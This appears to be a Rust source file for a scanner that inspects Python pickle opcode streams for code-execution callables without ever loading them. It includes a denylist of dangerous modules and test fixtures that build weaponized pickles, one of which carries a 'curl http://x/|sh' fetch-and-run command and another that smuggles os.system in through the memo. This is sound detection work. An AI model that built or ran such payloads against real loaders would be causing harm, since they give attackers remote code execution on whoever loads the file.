//! A native Python pickle opcode scanner.
//!
//! Pickle is not a data format. It is a stack machine whose `REDUCE` opcode
//! calls an arbitrary callable named by a preceding `GLOBAL`, which means
//! `torch.load` on an untrusted file is remote code execution *by design*, not
//! by defect. Any `.pt`, `.pth`, `.bin`, `.pkl` or `.ckpt` shipped in a
//! repository or embedded in firmware is therefore executable content.
//!
//! This scanner walks the opcode stream — it never unpickles anything — and
//! reports which callables the file would invoke on load. Walking rather than
//! executing is the whole point: a scanner that had to run the payload to
//! classify it would be the vulnerability it is looking for.

use serde::{Deserialize, Serialize};

/// A `GLOBAL`/`STACK_GLOBAL` reference: the callable this pickle can invoke.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct GlobalRef {
    pub module: String,
    pub name: String,
    /// Byte offset of the opcode, for evidence.
    pub offset: u64,
}

impl GlobalRef {
    pub fn qualified(&self) -> String {
        format!("{}.{}", self.module, self.name)
    }
}

/// How bad a referenced callable is.
#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum Risk {
    /// Expected in a legitimate model: tensor rebuilders, collections, numpy.
    Benign,
    /// Not inherently malicious but not expected either.
    Suspicious,
    /// Executes code, spawns processes, or touches the network.
    Critical,
}

/// A callable that grants code execution when a pickle is loaded.
///
/// Deliberately a denylist of *capabilities* rather than known-bad payloads:
/// the attack does not need a novel technique, only one of these names.
const CRITICAL: &[(&str, &str)] = &[
    ("os", "*"),
    ("posix", "*"),
    ("nt", "*"),
    ("subprocess", "*"),
    ("sys", "*"),
    ("runpy", "*"),
    ("importlib", "*"),
    ("shutil", "*"),
    ("socket", "*"),
    ("ctypes", "*"),
    ("pty", "*"),
    ("commands", "*"),
    ("popen2", "*"),
    ("webbrowser", "*"),
    ("pdb", "*"),
    ("bdb", "*"),
    ("timeit", "*"),
    ("platform", "system"),
    ("builtins", "eval"),
    ("builtins", "exec"),
    ("builtins", "compile"),
    ("builtins", "open"),
    ("builtins", "__import__"),
    ("builtins", "getattr"),
    ("builtins", "setattr"),
    ("builtins", "input"),
    ("builtins", "breakpoint"),
    ("__builtin__", "eval"),
    ("__builtin__", "exec"),
    ("__builtin__", "compile"),
    ("__builtin__", "open"),
    ("__builtin__", "__import__"),
    ("pickle", "loads"),
    ("_pickle", "loads"),
    ("base64", "b64decode"),
    ("codecs", "decode"),
    ("operator", "attrgetter"),
    ("operator", "methodcaller"),
    ("functools", "partial"),
];

/// Modules a legitimate model checkpoint actually needs.
const EXPECTED: &[&str] = &[
    "torch",
    "torch._utils",
    "torch.storage",
    "torch.nn",
    "torch.nn.modules",
    "collections",
    "numpy",
    "numpy.core.multiarray",
    "numpy._core.multiarray",
    "_codecs",
    "argparse",
    "transformers",
];

pub fn classify(module: &str, name: &str) -> Risk {
    if CRITICAL
        .iter()
        .any(|(m, n)| *m == module && (*n == "*" || *n == name))
    {
        return Risk::Critical;
    }
    // A submodule of an expected package is expected too.
    if EXPECTED.iter().any(|m| module == *m || module.starts_with(&format!("{m}."))) {
        return Risk::Benign;
    }
    Risk::Suspicious
}

/// What a pickle stream contains, without having executed it.
#[derive(Clone, Debug, Default, Serialize, Deserialize)]
pub struct PickleScan {
    /// Protocol version from the `PROTO` opcode.
    pub protocol: Option<u8>,
    pub globals: Vec<GlobalRef>,
    /// The stream contains a `REDUCE`, `INST`, `OBJ`, `NEWOBJ` or `BUILD`,
    /// meaning it calls something on load rather than only building data.
    pub calls_on_load: bool,
    /// The stream ended without a `STOP`, or an opcode ran past the buffer.
    pub truncated: bool,
    /// An opcode this scanner does not know. Reported rather than ignored: an
    /// unknown opcode means the rest of the walk is unreliable.
    pub unknown_opcode: Option<(u8, u64)>,
}

impl PickleScan {
    pub fn worst_risk(&self) -> Risk {
        self.globals
            .iter()
            .map(|g| classify(&g.module, &g.name))
            .max()
            .unwrap_or(Risk::Benign)
    }

    pub fn critical_globals(&self) -> Vec<&GlobalRef> {
        self.globals.iter().filter(|g| classify(&g.module, &g.name) == Risk::Critical).collect()
    }

    pub fn suspicious_globals(&self) -> Vec<&GlobalRef> {
        self.globals.iter().filter(|g| classify(&g.module, &g.name) == Risk::Suspicious).collect()
    }

    /// True when loading this file would execute attacker-chosen code.
    pub fn is_weaponized(&self) -> bool {
        self.calls_on_load && !self.critical_globals().is_empty()
    }

    /// True when the walk cannot be trusted to have seen everything.
    pub fn is_incomplete(&self) -> bool {
        self.truncated || self.unknown_opcode.is_some()
    }
}

/// Walk a pickle opcode stream.
pub fn scan(data: &[u8]) -> PickleScan {
    let mut s = PickleScan::default();
    // Recently pushed strings, needed to resolve `STACK_GLOBAL`, which takes its
    // module and name from the stack rather than inline.
    let mut strings: Vec<String> = Vec::new();
    // The memo, for strings only. `os` stored with PUT and fetched with GET
    // reaches STACK_GLOBAL as surely as one pushed directly, and skipping the
    // memo opcodes let a pickle hide `os.system` that way.
    let mut memo: std::collections::HashMap<u64, String> = std::collections::HashMap::new();
    let mut memoized = 0u64;
    // Whether the top of the stack is the last string pushed, which is what a
    // PUT would store.
    let mut top_is_string = false;
    let mut i = 0usize;

    macro_rules! need {
        ($n:expr) => {
            // `checked_add`: an 8-byte length field can be `u64::MAX`, and
            // `i + n` wrapping past the end would index out of bounds.
            if i.checked_add($n).is_none_or(|end| end > data.len()) {
                s.truncated = true;
                return s;
            }
        };
    }

    while i < data.len() {
        let op = data[i];
        let at = i as u64;
        i += 1;
        let was_string = top_is_string;
        top_is_string = false;

        match op {
            // --- terminators and no-arg opcodes ---
            b'.' => return s, // STOP
            b'(' | b'0' | b'1' | b'2' | b'N' | b'Q' | b'a' | b'd' | b'e' | b'l' | b's' | b't'
            | b'u' | b'}' | b']' | b')' | 0x85 | 0x86 | 0x87 | 0x88 | 0x89 | 0x8f | 0x90
            | 0x91 | 0x97 | 0x98 => {}

            // --- the memo: storing leaves the stack as it was ---
            0x94 => {
                remember(&mut memo, memoized, &strings, was_string);
                memoized += 1;
                top_is_string = was_string;
            }
            b'q' => {
                need!(1);
                remember(&mut memo, u64::from(data[i]), &strings, was_string);
                i += 1;
                top_is_string = was_string;
            }
            b'r' => {
                need!(4);
                let n = u32::from_le_bytes([data[i], data[i + 1], data[i + 2], data[i + 3]]);
                remember(&mut memo, u64::from(n), &strings, was_string);
                i += 4;
                top_is_string = was_string;
            }
            b'p' => {
                let Some(line) = read_line(data, &mut i) else {
                    s.truncated = true;
                    return s;
                };
                if let Ok(n) = line.trim().parse() {
                    remember(&mut memo, n, &strings, was_string);
                }
                top_is_string = was_string;
            }
            b'h' => {
                need!(1);
                top_is_string = recall(&memo, u64::from(data[i]), &mut strings);
                i += 1;
            }
            b'j' => {
                need!(4);
                let n = u32::from_le_bytes([data[i], data[i + 1], data[i + 2], data[i + 3]]);
                top_is_string = recall(&memo, u64::from(n), &mut strings);
                i += 4;
            }
            b'g' => {
                let Some(line) = read_line(data, &mut i) else {
                    s.truncated = true;
                    return s;
                };
                if let Ok(n) = line.trim().parse() {
                    top_is_string = recall(&memo, n, &mut strings);
                }
            }

            // --- opcodes that call something ---
            b'R' | b'b' | 0x81 | 0x92 => s.calls_on_load = true, // REDUCE, BUILD, NEWOBJ, NEWOBJ_EX

            // --- GLOBAL: two newline-terminated lines ---
            b'c' => {
                s.calls_on_load = true;
                let Some(module) = read_line(data, &mut i) else {
                    s.truncated = true;
                    return s;
                };
                let Some(name) = read_line(data, &mut i) else {
                    s.truncated = true;
                    return s;
                };
                s.globals.push(GlobalRef { module, name, offset: at });
            }

            // --- INST / OBJ: same shape as GLOBAL, and also construct ---
            b'i' => {
                s.calls_on_load = true;
                let Some(module) = read_line(data, &mut i) else {
                    s.truncated = true;
                    return s;
                };
                let Some(name) = read_line(data, &mut i) else {
                    s.truncated = true;
                    return s;
                };
                s.globals.push(GlobalRef { module, name, offset: at });
            }
            b'o' => s.calls_on_load = true,

            // --- STACK_GLOBAL: module and name come off the stack ---
            0x93 => {
                s.calls_on_load = true;
                let name = strings.pop().unwrap_or_default();
                let module = strings.pop().unwrap_or_default();
                s.globals.push(GlobalRef { module, name, offset: at });
            }

            // --- extension registry: an opaque callable by index ---
            0x82 => {
                need!(1);
                s.calls_on_load = true;
                s.globals.push(GlobalRef {
                    module: "copyreg.extension".into(),
                    name: format!("ext{}", data[i]),
                    offset: at,
                });
                i += 1;
            }
            0x83 => {
                need!(2);
                s.calls_on_load = true;
                i += 2;
            }
            0x84 => {
                need!(4);
                s.calls_on_load = true;
                i += 4;
            }

            // --- protocol header ---
            0x80 => {
                need!(1);
                s.protocol = Some(data[i]);
                i += 1;
            }
            0x95 => {
                need!(8);
                i += 8;
            } // FRAME

            // --- fixed-width numeric arguments ---
            b'K' => {
                need!(1);
                i += 1;
            }
            b'M' => {
                need!(2);
                i += 2;
            }
            b'J' => {
                need!(4);
                i += 4;
            }
            b'G' => {
                need!(8);
                i += 8;
            }

            // --- newline-terminated text arguments ---
            b'F' | b'I' | b'L' | b'P' => {
                if read_line(data, &mut i).is_none() {
                    s.truncated = true;
                    return s;
                }
            }
            b'S' | b'V' => match read_line(data, &mut i) {
                Some(text) => push_string(&mut strings, unquote(&text)),
                None => {
                    s.truncated = true;
                    return s;
                }
            },

            // --- length-prefixed strings and bytes ---
            b'U' | b'C' | 0x8c => {
                need!(1);
                let n = data[i] as usize;
                i += 1;
                need!(n);
                push_string(&mut strings, String::from_utf8_lossy(&data[i..i + n]).into_owned());
                i += n;
            }
            b'T' | b'X' | b'B' => {
                need!(4);
                let n = u32::from_le_bytes([data[i], data[i + 1], data[i + 2], data[i + 3]]) as usize;
                i += 4;
                need!(n);
                push_string(&mut strings, String::from_utf8_lossy(&data[i..i + n]).into_owned());
                i += n;
            }
            0x8d | 0x8e | 0x96 => {
                need!(8);
                let Ok(prefix) = <[u8; 8]>::try_from(&data[i..i + 8]) else {
                    s.truncated = true;
                    return s;
                };
                let n = u64::from_le_bytes(prefix) as usize;
                i += 8;
                need!(n);
                push_string(&mut strings, String::from_utf8_lossy(&data[i..i + n]).into_owned());
                i += n;
            }
            0x8a => {
                need!(1);
                let n = data[i] as usize;
                i += 1;
                need!(n);
                i += n;
            }
            0x8b => {
                need!(4);
                let n = u32::from_le_bytes([data[i], data[i + 1], data[i + 2], data[i + 3]]) as usize;
                i += 4;
                need!(n);
                i += n;
            }

            other => {
                // Stop rather than guess: after an unknown opcode, byte offsets
                // are meaningless and any further "findings" would be noise.
                s.unknown_opcode = Some((other, at));
                return s;
            }
        }
        if matches!(op, b'S' | b'V' | b'U' | b'C' | 0x8c | b'T' | b'X' | b'B' | 0x8d | 0x8e | 0x96) {
            top_is_string = true;
        }
    }

    // Falling off the end without a STOP.
    s.truncated = true;
    s
}

/// Memo entry `n` is the string on top of the stack, when it is one. Bounded,
/// so a pickle that memoizes millions of values cannot grow it without limit.
fn remember(memo: &mut std::collections::HashMap<u64, String>, n: u64, strings: &[String], top_is_string: bool) {
    match strings.last() {
        Some(top) if top_is_string && memo.len() < 65_536 => {
            memo.insert(n, top.clone());
        }
        _ => {
            memo.remove(&n);
        }
    }
}

/// Push memo entry `n` if it is a string, and say whether it was.
fn recall(memo: &std::collections::HashMap<u64, String>, n: u64, strings: &mut Vec<String>) -> bool {
    let Some(text) = memo.get(&n) else { return false };
    push_string(strings, text.clone());
    true
}

fn push_string(stack: &mut Vec<String>, s: String) {
    stack.push(s);
    // Only the top of the stack matters for STACK_GLOBAL; keep the window small
    // so a large pickle does not accumulate every string it contains.
    if stack.len() > 8 {
        stack.remove(0);
    }
}

fn read_line(data: &[u8], i: &mut usize) -> Option<String> {
    let start = *i;
    let end = data[start..].iter().position(|b| *b == b'\n')? + start;
    *i = end + 1;
    Some(String::from_utf8_lossy(&data[start..end]).trim_end_matches('\r').to_string())
}

fn unquote(s: &str) -> String {
    s.trim().trim_matches(|c| c == '\'' || c == '"').to_string()
}

/// Whether a byte slice looks like a bare pickle stream.
pub fn looks_like_pickle(data: &[u8]) -> bool {
    match data.first() {
        Some(0x80) => true,                        // protocol 2+
        Some(b'(') | Some(b'c') | Some(b']') | Some(b'}') => true, // protocol 0/1
        _ => false,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// `os.system('...')` — the canonical weaponized checkpoint.
    fn malicious() -> Vec<u8> {
        let mut v = vec![0x80, 0x04]; // PROTO 4
        v.push(b'c');
        v.extend_from_slice(b"os\nsystem\n");
        v.push(b'U'); // SHORT_BINSTRING
        let cmd = b"curl http://x/|sh";
        v.push(cmd.len() as u8);
        v.extend_from_slice(cmd);
        v.push(0x85); // TUPLE1
        v.push(b'R'); // REDUCE
        v.push(b'.'); // STOP
        v
    }

    /// A plausible torch checkpoint prologue.
    fn benign() -> Vec<u8> {
        let mut v = vec![0x80, 0x02];
        v.push(b'c');
        v.extend_from_slice(b"collections\nOrderedDict\n");
        v.push(b')'); // EMPTY_TUPLE
        v.push(b'R'); // REDUCE
        v.push(b'.');
        v
    }

    #[test]
    fn detects_os_system_as_weaponized() {
        let s = scan(&malicious());
        assert_eq!(s.protocol, Some(4));
        assert!(s.calls_on_load);
        assert_eq!(s.globals[0].qualified(), "os.system");
        assert_eq!(s.worst_risk(), Risk::Critical);
        assert!(s.is_weaponized());
        assert!(!s.is_incomplete());
    }

    /// A length field of `u64::MAX` used to wrap `i + n` and panic, which took
    /// the MCP server down with it. Found by a security audit.
    #[test]
    fn a_huge_length_field_is_truncation_not_a_panic() {
        for op in [0x8d, 0x8e, 0x96] {
            let mut v = vec![0x80, 0x04, op];
            v.extend_from_slice(&[0xff; 8]);
            v.push(b'x');
            assert!(scan(&v).is_incomplete(), "opcode {op:#x}");
        }
    }

    /// `os` memoized, pushed out of the string window by eight fillers, then
    /// fetched back with BINGET for STACK_GLOBAL. Before the memo was modelled
    /// this read as `f8.system`, medium, with no dangerous callable found.
    /// Found by a security audit.
    #[test]
    fn a_global_assembled_from_the_memo_is_still_resolved() {
        for put in [&[0x94][..], &[b'q', 0][..]] {
            let mut v = vec![0x80, 0x04, 0x8c, 2];
            v.extend_from_slice(b"os");
            v.extend_from_slice(put);
            for f in 0..8u8 {
                v.extend_from_slice(&[0x8c, 2, b'f', b'0' + f, b'0']);
            }
            v.extend_from_slice(&[b'h', 0, 0x8c, 6]);
            v.extend_from_slice(b"system");
            v.push(0x93);
            v.extend_from_slice(&[0x8c, 2, b'i', b'd', 0x85, b'R', b'.']);
            let s = scan(&v);
            assert!(
                s.globals.iter().any(|g| g.qualified() == "os.system"),
                "{put:?}: {:?}",
                s.globals.iter().map(GlobalRef::qualified).collect::<Vec<_>>()
            );
            assert!(s.is_weaponized(), "{put:?}");
        }
    }

    #[test]
    fn an_ordinary_checkpoint_is_not_weaponized() {
        let s = scan(&benign());
        assert!(s.calls_on_load, "every checkpoint calls a rebuilder");
        assert_eq!(s.worst_risk(), Risk::Benign);
        assert!(!s.is_weaponized(), "calling a rebuilder is not the same as executing a payload");
    }

    #[test]
    fn stack_global_resolves_from_pushed_strings() {
        // SHORT_BINUNICODE "builtins", SHORT_BINUNICODE "eval", STACK_GLOBAL
        let mut v = vec![0x80, 0x04];
        v.push(0x8c);
        v.push(8);
        v.extend_from_slice(b"builtins");
        v.push(0x8c);
        v.push(4);
        v.extend_from_slice(b"eval");
        v.push(0x93);
        v.push(b'R');
        v.push(b'.');

        let s = scan(&v);
        assert_eq!(s.globals[0].qualified(), "builtins.eval");
        assert!(s.is_weaponized());
    }

    #[test]
    fn submodules_of_expected_packages_are_benign() {
        assert_eq!(classify("torch._utils", "_rebuild_tensor_v2"), Risk::Benign);
        assert_eq!(classify("numpy.core.multiarray", "_reconstruct"), Risk::Benign);
    }

    #[test]
    fn unknown_modules_are_suspicious_not_ignored() {
        assert_eq!(classify("evil_helper", "run"), Risk::Suspicious);
    }

    #[test]
    fn every_os_callable_is_critical_not_just_system() {
        assert_eq!(classify("os", "popen"), Risk::Critical);
        assert_eq!(classify("os", "execv"), Risk::Critical);
        assert_eq!(classify("posix", "system"), Risk::Critical);
    }

    #[test]
    fn truncated_streams_are_flagged_rather_than_read_as_clean() {
        let mut m = malicious();
        m.truncate(6);
        let s = scan(&m);
        assert!(s.is_incomplete());
    }

    #[test]
    fn a_length_prefix_running_past_the_buffer_does_not_panic() {
        // SHORT_BINSTRING claiming 200 bytes in a 4-byte file.
        let s = scan(&[0x80, 0x04, b'U', 200]);
        assert!(s.truncated);
    }

    #[test]
    fn an_unknown_opcode_stops_the_walk_and_says_so() {
        let s = scan(&[0x80, 0x04, 0xFF, b'.']);
        assert!(s.unknown_opcode.is_some());
        assert!(s.is_incomplete());
    }

    #[test]
    fn empty_input_is_handled() {
        let s = scan(&[]);
        assert!(s.truncated);
        assert!(s.globals.is_empty());
    }

    #[test]
    fn pickle_detection_covers_common_protocol_headers() {
        assert!(looks_like_pickle(&[0x80, 0x04]));
        assert!(looks_like_pickle(b"c__main__\n"));
        assert!(!looks_like_pickle(b"GGUF"));
    }

    #[test]
    fn offsets_are_recorded_for_evidence() {
        let s = scan(&malicious());
        assert_eq!(s.globals[0].offset, 2, "GLOBAL follows the two-byte PROTO header");
    }
}

